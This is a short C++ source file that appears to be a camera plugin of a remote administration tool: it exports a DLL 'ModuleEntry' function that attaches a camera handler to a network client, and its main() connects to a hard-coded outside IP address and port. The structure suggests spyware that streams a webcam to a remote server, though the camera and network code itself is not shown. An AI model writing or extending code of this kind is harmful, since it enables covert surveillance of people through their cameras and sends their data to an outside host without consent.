#include "IOCPClient.h"
#include "Camera.h"


extern "C" __declspec(dllexport) 
void  ModuleEntry(char* szServerAddr, unsigned short uPort, DWORD dwParam){
	CIOCPClient *pClient = new CIOCPClient(szServerAddr, uPort);

	CMsgHandler *pHandler = new CCamera(pClient);
	pClient->Run();

	delete pHandler;
	delete pClient;
}

int main(){
	CIOCPClient::SocketInit();
	ModuleEntry("49.235.129.40", 8081, 0);
	CIOCPClient::SocketTerm();
	return 0;
}